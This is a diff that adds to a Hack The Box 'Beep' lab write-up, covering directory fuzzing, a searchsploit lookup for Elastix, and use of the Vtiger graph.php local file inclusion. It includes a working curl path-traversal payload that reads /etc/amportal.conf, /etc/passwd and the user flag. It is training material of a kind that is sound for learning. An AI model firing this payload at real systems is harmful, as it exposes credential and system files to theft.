@@ -100,3 +100,89 @@ PORT      STATE SERVICE    REASON         VERSION
 |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
 Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
 ```
+
+Since, I got so many open ports I started my enumeration with Webserver hosted on port 80 & 443.
+
+Port 80 is re-directing all the traffic towards port 443, i.e. https://10.10.10.7
+
+The main homepage is having some Elastix application running which requires authentication:
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/38793ce7-da82-4b54-86e8-981844a61c01)
+
+### Fuzzing:
+
+Once confirming the web-server is running on port 443 I executed the sub-directory enumeration using GoBuster, which gave me multiple sub-directories in the result:
+
+```bash
+gobuster dir -u https://10.10.10.7/ -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o beep_web -b 404,403 -k
+```
+```Rust
+/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
+/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
+/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
+/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
+/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
+/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
+/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
+/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
+/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
+/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]
+/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
+/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
+/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
+/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]
+```
+
+I started checking the intresting directories one by one, in the "/admin" the application revealed the backend application & it's version "FreePBX 2.8.1.4".
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3e3c9f48-7807-4331-9982-e3315ce7cb7d)
+
+Vtiger CRM 5.1.0 running on "/vtigercrm":
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/444a6c4f-aaa6-4123-96fe-0be67220ef73)
+
+Free PBX 2.5 running on "/recordings"
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/94f5237b-0599-4882-a56e-88fac5daf267)
+
+After checking all the web-directories I checked for the exploits related to Elastix on searchsploit & got few results:
+
+```bash
+searchsploit Elastix
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4d4d3aa8-ba1d-401b-8b1c-bb599af1edb5)
+
+Since first 3 exploits are related to XSS & I still not authenticated I choose the 3rd exploit from the results "Elastix 2.2.0 - 'graph.php' Local File Inclusion" & downloaded it.
+
+```bash
+searchsploit -m php/webapps/37637.pl
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dc8aaeaa-6523-47ad-bb89-1839b902ba2f)
+
+After downnloading I checked the script content & found the POC in comment of the script:
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/247a864a-a960-406b-a3ec-c81713476da6)
+
+So, basically the vulnerability exists in the Vtiger CRM. Instead of using the scirpt I manually queried the vulnerable path using curl & got the response:
+
+```bash
+curl -k -vv 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action'
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7e909688-ff22-4c9f-a610-a8ed5749062b)
+
+Since the result is too big, I queried the same URL in the browser for better view & got multiple credentils present in the "amportal.conf" file.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7151713b-f893-4144-b60e-b707e67e10c3)
+
+I changed the directory to "/etc/passwd" & found a user "fanis" in it.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e175f570-461b-4b15-ae39-54462adbc19d)
+
+## User flag:
+
+By applying the same logic I again changed the directory to "/home/fanis/user.txt" & got user flag as well. But this might not be the intended way to fetch the flag as I still not have the shell access.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/74dff33a-c861-4b17-863a-d8ae6a96f43e)
+
+
+
